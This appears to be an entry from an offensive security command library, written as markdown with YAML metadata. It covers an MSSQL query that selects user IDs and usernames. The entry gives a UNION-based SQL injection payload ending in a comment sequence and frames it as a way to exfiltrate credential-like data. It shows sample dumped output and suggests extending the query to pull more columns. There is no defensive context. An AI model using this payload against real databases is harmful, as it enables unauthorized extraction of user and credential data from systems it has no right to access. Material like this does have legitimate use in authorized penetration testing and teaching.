---
type: command
executor: sql
data: 'SELECT UserId, UserName FROM Users'
output: null
created_at: '2023-10-01T00:00:00+00:00'
updated_at: '2023-10-01T00:00:00+00:00'
platforms:
  - Windows
tags:
  - sql-injection
  - collection
verified: true
validated: true
---

# MSSQL Select UserId Username from Users

## Command

```sql
SELECT UserId, UserName FROM Users
```

## Description

This command selects UserId and UserName columns from the Users table to extract credential-like data. Inject via UNION for data exfiltration in reconnaissance or collection phases.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| UserId, UserName | Specific columns to retrieve | Yes |
| Users | Target table | Yes |

## Examples

### Basic Usage

```sql
SELECT UserId, UserName FROM Users
```

### In Injection Context

' UNION SELECT UserId, UserName FROM Users--

## Expected Output

1	admin
2	user1

Dumps user data; extend with more columns or WHERE clauses if needed.

## Related

- [[procedures/mssql-union-based-injection-for-database-enumeration]]
- [[commands/mssql-select-columns-from-users-table]]
